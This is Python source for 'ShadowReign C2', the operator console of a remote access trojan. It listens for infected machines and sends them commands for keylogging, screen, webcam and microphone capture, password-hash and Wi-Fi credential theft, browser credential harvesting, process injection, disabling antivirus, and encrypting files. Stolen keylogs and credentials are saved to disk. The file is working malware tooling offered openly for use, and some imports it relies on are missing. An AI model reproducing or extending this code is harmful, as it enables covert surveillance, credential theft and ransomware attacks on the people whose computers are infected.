import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import socket
import threading
import json
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from PIL import Image, ImageTk
import io
import time

class ShadowReignGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("ShadowReign C2 - Elite Control")
        self.root.geometry("1400x900")
        self.root.configure(bg="#0A0F1A")  # Dark Kali blue
        self.root.attributes('-alpha', 0.95)  # Glassy transparency
        self.HOST = "0.0.0.0"
        self.PORT = 5251
        self.KEY = hashlib.sha256(b"ShadowReignBoss!").digest()
        self.clients = {}
        self.clients_lock = threading.Lock()
        self.selected_client = None
        self.home_dir = os.path.expanduser("~")
        self.setup_ui()
        self.start_server()
        self.root.mainloop()

    def setup_ui(self):
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background="#0A0F1A", borderwidth=0)
        style.configure("TNotebook.Tab", 
                        background="#1C2526", 
                        foreground="#00FFCC",  # Neon cyan
                        padding=[25, 12], 
                        font=("Courier", 14, "bold"),
                        borderwidth=2, 
                        bordercolor="#00FFCC")
        style.map("TNotebook.Tab", 
                  background=[("selected", "#2E3B4E")], 
                  foreground=[("selected", "#FFFFFF")])
        style.configure("Treeview", 
                        background="#1C2526", 
                        foreground="#FFFFFF", 
                        fieldbackground="#1C2526", 
                        font=("Courier", 12),
                        rowheight=35)
        style.configure("Treeview.Heading", 
                        background="#0A0F1A", 
                        foreground="#00FFCC", 
                        font=("Courier", 13, "bold"))

        # Sidebar
        sidebar = tk.Frame(self.root, bg="#0A0F1A", width=400, relief="flat", borderwidth=2, highlightbackground="#00FFCC")
        sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=10, pady=10)
        tk.Label(sidebar, 
                 text="> TARGETS", 
                 bg="#0A0F1A", 
                 fg="#00FFCC", 
                 font=("Courier", 20, "bold")).pack(pady=(10, 5), padx=10, anchor="w")
        
        self.client_list = ttk.Treeview(sidebar, 
                                        columns=("ID", "IP", "OS", "Status", "Anti-VM"), 
                                        show="headings", 
                                        height=15)
        self.client_list.heading("ID", text="ID")
        self.client_list.heading("IP", text="IP")
        self.client_list.heading("OS", text="OS")
        self.client_list.heading("Status", text="STATUS")
        self.client_list.heading("Anti-VM", text="ANTI-VM")
        self.client_list.column("ID", width=50, anchor="center")
        self.client_list.column("IP", width=150, anchor="center")
        self.client_list.column("OS", width=100, anchor="center")
        self.client_list.column("Status", width=80, anchor="center")
        self.client_list.column("Anti-VM", width=80, anchor="center")
        self.client_list.pack(fill=tk.Y, padx=10, pady=10)
        self.client_list.bind("<<TreeviewSelect>>", self.select_client)

        # Main Frame
        self.main_frame = tk.Frame(self.root, bg="#0A0F1A", relief="flat", borderwidth=2, highlightbackground="#00FFCC")
        self.main_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(self.main_frame, 
                 text="> SHADOWREIGN C2", 
                 bg="#0A0F1A", 
                 fg="#00FFCC", 
                 font=("Courier", 24, "bold")).pack(pady=(5, 10), anchor="w")
        
        self.notebook = ttk.Notebook(self.main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, pady=5)

        tabs = {
            "Keys": self.create_keylogger_tab,
            "Files": self.create_files_tab,
            "Media": self.create_media_tab,
            "System": self.create_system_tab,
            "Chaos": self.create_pranks_tab,
            "Shell": self.create_shell_tab,
            "Live": self.create_live_tab,
            "Advanced": self.create_advanced_tab,
            "Remote": self.create_remote_tab,
            "Exploit": self.create_exploit_tab  # New tab for advanced exploits
        }
        for name, func in tabs.items():
            tab = tk.Frame(self.notebook, bg="#0A0F1A")
            self.notebook.add(tab, text=name)
            func(tab)

    def create_button(self, parent, text, command):
        btn = tk.Button(parent, 
                        text=text, 
                        command=command, 
                        bg="#2E3B4E", 
                        fg="#00FFCC", 
                        font=("Courier", 12, "bold"), 
                        bd=2, 
                        relief="flat", 
                        highlightbackground="#00FFCC", 
                        highlightthickness=1, 
                        padx=20, 
                        pady=10, 
                        activebackground="#4A90E2", 
                        cursor="hand2")
        btn.pack(pady=8, padx=5, side=tk.LEFT)
        return btn

    def encrypt(self, data):
        try:
            cipher = AES.new(self.KEY, AES.MODE_GCM)
            ct_bytes, tag = cipher.encrypt_and_digest(data.encode())
            iv = base64.b64encode(cipher.nonce).decode()
            ct = base64.b64encode(ct_bytes).decode()
            tag = base64.b64encode(tag).decode()
            return f"{iv}:{ct}:{tag}"
        except Exception:
            return None

    def decrypt(self, data):
        try:
            iv, ct, tag = data.split(":")
            iv = base64.b64decode(iv)
            ct = base64.b64decode(ct)
            tag = base64.b64decode(tag)
            cipher = AES.new(self.KEY, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(ct, tag).decode()
        except Exception:
            return None

    def send_message(self, sock, message):
        try:
            compressed = zlib.compress(message.encode())
            encrypted = self.encrypt(base64.b64encode(compressed).decode())
            length = len(encrypted)
            length_bytes = length.to_bytes(4, byteorder='big')
            sock.sendall(length_bytes)
            sock.sendall(encrypted.encode())
        except Exception:
            pass

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        self.server.settimeout(30)
        self.server.bind((self.HOST, self.PORT))
        self.server.listen(50)
        threading.Thread(target=self.accept_clients, daemon=True).start()

    def accept_clients(self):
        client_id = 0
        while True:
            try:
                client_socket, addr = self.server.accept()
                client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                client_socket.settimeout(10)
                ip = addr[0]
                with self.clients_lock:
                    existing_id = next((cid for cid, (sock, info) in self.clients.items() if info["ip"] == ip), None)
                    if existing_id is not None:
                        self.clients[existing_id] = (client_socket, {"ip": ip, "os": "Unknown", "status": "Reconnecting", "anti_vm": False, "last_seen": time.time()})
                    else:
                        self.clients[client_id] = (client_socket, {"ip": ip, "os": "Unknown", "status": "Online", "anti_vm": False, "last_seen": time.time()})
                        client_id += 1
                    threading.Thread(target=self.handle_client, args=(existing_id if existing_id is not None else client_id - 1,), daemon=True).start()
                self.queue_gui_update()
            except Exception:
                time.sleep(0.5)

    def handle_client(self, client_id):
        with self.clients_lock:
            sock = self.clients[client_id][0]
        last_heartbeat = time.time()
        while True:
            try:
                length_bytes = sock.recv(4)
                if not length_bytes:
                    if time.time() - last_heartbeat > 15:
                        with self.clients_lock:
                            self.clients[client_id][1]["status"] = "Offline"
                        self.queue_gui_update()
                    break
                length = int.from_bytes(length_bytes, byteorder='big')
                data = b""
                while len(data) < length:
                    chunk = sock.recv(min(1024, length - len(data)))
                    if not chunk:
                        raise Exception("Socket closed")
                    data += chunk
                response = json.loads(self.decrypt(data.decode()))
                with self.clients_lock:
                    self.clients[client_id][1].update(response)
                    self.clients[client_id][1]["last_seen"] = time.time()
                    if response.get("ping") == "heartbeat":
                        last_heartbeat = time.time()
                    else:
                        self.clients[client_id][1]["status"] = "Online"
                if response.get("ping") != "heartbeat":
                    self.process_response(client_id, response)
            except Exception:
                if time.time() - last_heartbeat > 15:
                    with self.clients_lock:
                        self.clients[client_id][1]["status"] = "Offline"
                    self.queue_gui_update()
                break

    def process_response(self, client_id, response):
        if "keylogs" in response:
            self.update_text(self.keylog_display, response["keylogs"])
            self.save_to_file("keylogs.txt", response["keylogs"])
        elif "files" in response:
            self.update_text(self.file_display, "\n".join(response["files"]))
        elif "screenshot" in response:
            self.display_image(response["screenshot"], "screenshot.png")
        elif "remote_frame" in response and client_id == self.selected_client:
            self.update_stream(response["remote_frame"])
        elif "shell_output" in response:
            self.update_text(self.live_shell_output, response["shell_output"])
        elif "creds" in response:
            creds_text = "\n".join([f"{url}: {info['user']} - {info['pass']}" for url, info in response["creds"].items()])
            self.update_text(self.shell_output, creds_text)
            self.save_to_file("credentials.txt", creds_text)
        elif "encrypted" in response:
            self.update_text(self.exploit_output, f"Encrypted: {response['encrypted']} | Key: {response['key']}")
        self.queue_gui_update()

    def queue_gui_update(self):
        self.root.after(0, self.update_client_list)

    def update_client_list(self):
        with self.clients_lock:
            current_clients = dict(self.clients)
        self.client_list.delete(*self.client_list.get_children())
        for cid, (sock, info) in current_clients.items():
            status_color = "#00FF00" if info["status"] == "Online" else "#FFFF00" if info["status"] == "Reconnecting" else "#FF0000"
            self.client_list.insert("", "end", values=(cid, info["ip"], info["os"], info["status"], "On" if info["anti_vm"] else "Off"), tags=(status_color,))
            self.client_list.tag_configure(status_color, foreground=status_color)

    def update_text(self, widget, text):
        widget.delete(1.0, tk.END)
        widget.insert(tk.END, text)

    def save_to_file(self, filename, data, binary=False):
        filepath = os.path.join(self.home_dir, f"ShadowReign_{filename}")
        mode = "wb" if binary else "w"
        with open(filepath, mode) as f:
            f.write(data)

    def display_image(self, b64_data, filename):
        img_data = base64.b64decode(b64_data)
        img = Image.open(io.BytesIO(img_data))
        img.thumbnail((400, 300))
        photo = ImageTk.PhotoImage(img)
        self.media_display.configure(image=photo)
        self.media_display.image = photo
        self.save_to_file(filename, img_data, binary=True)

    def update_stream(self, b64_data):
        if hasattr(self, "stream_window") and self.stream_window:
            img_data = base64.b64decode(b64_data)
            img = Image.open(io.BytesIO(img_data))
            img.thumbnail((800, 600))
            photo = ImageTk.PhotoImage(img)
            self.stream_label.configure(image=photo)
            self.stream_label.image = photo

    def select_client(self, event):
        selected = self.client_list.selection()
        if selected:
            self.selected_client = int(self.client_list.item(selected[0])["values"][0])

    def send_command(self, command, data=None):
        if self.selected_client is None:
            messagebox.showerror("Error", "No active client selected!")
            return
        with self.clients_lock:
            sock = self.clients[self.selected_client][0]
            if self.clients[self.selected_client][1]["status"] in ["Online", "Reconnecting"]:
                self.send_message(sock, json.dumps({"command": command, "data": data}))

    def create_keylogger_tab(self, tab):
        tk.Label(tab, text="> KEYLOGS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "START", lambda: self.send_command("keylogger_start"))
        self.create_button(btn_frame, "STOP", lambda: self.send_command("keylogger_stop"))
        self.create_button(btn_frame, "DUMP", lambda: self.send_command("keylogger_dump"))
        self.keylog_display = tk.Text(tab, height=15, width=90, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
        self.keylog_display.pack(pady=15)

    def create_files_tab(self, tab):
        tk.Label(tab, text="> FILES", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "LIST", lambda: self.send_command("list_files"))
        self.create_button(btn_frame, "UPLOAD", self.upload_file)
        self.create_button(btn_frame, "DOWNLOAD", self.download_file)
        self.file_display = tk.Text(tab, height=15, width=90, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
        self.file_display.pack(pady=15)

    def upload_file(self):
        filepath = filedialog.askopenfilename()
        if filepath:
            target_path = tk.simpledialog.askstring("Target Path", "Enter path on target:")
            if target_path:
                with open(filepath, "rb") as f:
                    content = base64.b64encode(f.read()).decode()
                self.send_command("receive_file", {"path": target_path, "content": content})

    def download_file(self):
        remote_path = tk.simpledialog.askstring("Remote Path", "Enter file path on target:")
        if remote_path:
            self.send_command("send_file", remote_path)

    def create_media_tab(self, tab):
        tk.Label(tab, text="> MEDIA", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "SCREENSHOT", lambda: self.send_command("screenshot"))
        self.create_button(btn_frame, "RECORD SCREEN", lambda: self.send_command("record_screen"))
        self.create_button(btn_frame, "WEBCAM SNAP", lambda: self.send_command("webcam_snap"))
        self.media_display = tk.Label(tab, bg="#1C2526", bd=0)
        self.media_display.pack(pady=15)

    def create_system_tab(self, tab):
        tk.Label(tab, text="> SYSTEM", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "DUMP HASHES", lambda: self.send_command("dump_hashes"))
        self.create_button(btn_frame, "STEAL WIFI", lambda: self.send_command("steal_wifi"))
        self.create_button(btn_frame, "ELEVATE", lambda: self.send_command("elevate_privileges"))
        self.create_button(btn_frame, "TOGGLE ANTI-VM", self.toggle_anti_vm)

    def toggle_anti_vm(self):
        if self.selected_client is not None:
            with self.clients_lock:
                current_state = self.clients[self.selected_client][1]["anti_vm"]
            self.send_command("toggle_anti_vm", not current_state)

    def create_pranks_tab(self, tab):
        tk.Label(tab, text="> CHAOS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "JUMPSCARE", lambda: self.send_command("jumpscare"))
        self.create_button(btn_frame, "CRASH", lambda: self.send_command("crash_system"))
        self.create_button(btn_frame, "FORK BOMB", lambda: self.send_command("fork_bomb"))
        self.create_button(btn_frame, "FAKE ALERT", self.fake_alert)

    def fake_alert(self):
        message = tk.simpledialog.askstring("Fake Alert", "Enter alert message:")
        if message:
            self.send_command("fake_alert", {"message": message})

    def create_shell_tab(self, tab):
        tk.Label(tab, text="> LIVE SHELL", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        self.shell_input = tk.Entry(tab, width=60, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
        self.shell_input.pack(pady=10)
        self.create_button(tab, "EXECUTE", lambda: self.send_command("live_shell_cmd", self.shell_input.get()))
        self.live_shell_output = tk.Text(tab, height=15, width=90, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
        self.live_shell_output.pack(pady=15)
        self.send_command("live_shell")

    def create_live_tab(self, tab):
        tk.Label(tab, text="> LIVE STREAMS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "STREAM SCREEN", self.start_screen_stream)
        self.create_button(btn_frame, "STREAM WEBCAM", lambda: self.send_command("stream_webcam"))
        self.create_button(btn_frame, "STREAM MIC", lambda: self.send_command("stream_mic"))
        self.create_button(btn_frame, "STOP", lambda: self.send_command("stop_stream"))

    def start_screen_stream(self):
        self.send_command("remote_desktop", {"action": "start"})
        self.stream_window = tk.Toplevel(self.root)
        self.stream_window.title("> LIVE SCREEN")
        self.stream_window.configure(bg="#0A0F1A")
        self.stream_window.attributes('-alpha', 0.95)
        self.stream_label = tk.Label(self.stream_window, bg="#1C2526")
        self.stream_label.pack(pady=10, padx=10)

    def create_advanced_tab(self, tab):
        tk.Label(tab, text="> ADVANCED", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "INJECT", self.inject_process)
        self.create_button(btn_frame, "SELF-DESTRUCT", lambda: self.send_command("self_destruct"))
        self.create_button(btn_frame, "HARVEST CREDS", lambda: self.send_command("harvest_creds"))

    def inject_process(self):
        process_name = tk.simpledialog.askstring("Inject Process", "Enter process name (e.g., svchost.exe):")
        if process_name:
            self.send_command("inject", process_name)

    def create_remote_tab(self, tab):
        tk.Label(tab, text="> REMOTE DESKTOP", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "START", lambda: self.send_command("remote_desktop", {"action": "start"}))
        self.create_button(btn_frame, "STOP", lambda: self.send_command("stop_stream"))
        
        control_frame = tk.Frame(tab, bg="#0A0F1A")
        control_frame.pack(pady=10)
        tk.Label(control_frame, text="X:", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 12)).pack(side=tk.LEFT, padx=5)
        self.remote_x = tk.Entry(control_frame, width=8, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
        self.remote_x.pack(side=tk.LEFT, padx=5)
        tk.Label(control_frame, text="Y:", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 12)).pack(side=tk.LEFT, padx=5)
        self.remote_y = tk.Entry(control_frame, width=8, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
        self.remote_y.pack(side=tk.LEFT, padx=5)
        self.create_button(control_frame, "MOVE", self.move_mouse)
        self.create_button(control_frame, "CLICK", lambda: self.move_mouse(click=True))
        
        key_frame = tk.Frame(tab, bg="#0A0F1A")
        key_frame.pack(pady=10)
        tk.Label(key_frame, text="KEY:", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 12)).pack(side=tk.LEFT, padx=5)
        self.remote_key = tk.Entry(key_frame, width=8, bg="#1C2526", fg="#FFFFFF", font=("Courier", 12), insertbackground="#00FFCC", bd=0)
        self.remote_key.pack(side=tk.LEFT, padx=5)
        self.create_button(key_frame, "PRESS", self.press_key)

    def move_mouse(self, click=False):
        try:
            x = int(self.remote_x.get())
            y = int(self.remote_y.get())
            self.send_command("remote_desktop", {"action": "mouse", "x": x, "y": y, "click": click})
        except ValueError:
            messagebox.showerror("Error", "Invalid coordinates")

    def press_key(self):
        key = self.remote_key.get()
        if key:
            self.send_command("remote_desktop", {"action": "key", "key": key})

    def create_exploit_tab(self, tab):
        tk.Label(tab, text="> EXPLOITS", bg="#0A0F1A", fg="#00FFCC", font=("Courier", 18, "bold")).pack(pady=15)
        btn_frame = tk.Frame(tab, bg="#0A0F1A")
        btn_frame.pack(pady=10)
        self.create_button(btn_frame, "ENCRYPT FILES", lambda: self.send_command("encrypt_files"))
        self.create_button(btn_frame, "EXFIL BROWSER", lambda: self.send_command("exfil_browser"))
        self.create_button(btn_frame, "DISABLE AV", lambda: self.send_command("disable_av"))
        self.exploit_output = tk.Text(tab, height=15, width=90, bg="#1C2526", fg="#FFFFFF", font=("Courier", 11), bd=0)
        self.exploit_output.pack(pady=15)

if __name__ == "__main__":
    ShadowReignGUI()
